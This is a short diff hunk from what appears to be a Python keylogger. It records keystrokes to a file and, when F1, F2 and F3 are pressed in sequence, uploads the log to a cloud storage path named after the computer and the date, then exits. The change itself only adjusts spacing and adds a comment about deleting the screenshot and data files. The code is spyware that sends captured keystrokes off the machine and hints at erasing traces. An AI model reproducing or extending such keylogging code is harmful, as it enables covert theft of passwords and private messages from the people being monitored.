@@ -35,12 +35,14 @@ def on_press(key):
     lastThreeKeys.append(str(key))
 
     try:
-        if lastThreeKeys==['Key.f1','Key.f2','Key.f3']:
+        if lastThreeKeys == ['Key.f1', 'Key.f2', 'Key.f3']:
             f.close()
 
             storage.child(os.environ['COMPUTERNAME'] +
                           '/keylogs_' + today_date + '.txt') \
                 .put('data.txt')
+
+            # delete screenshot.jpg + data.txt
             os._exit(1)
 
         printKey(key)
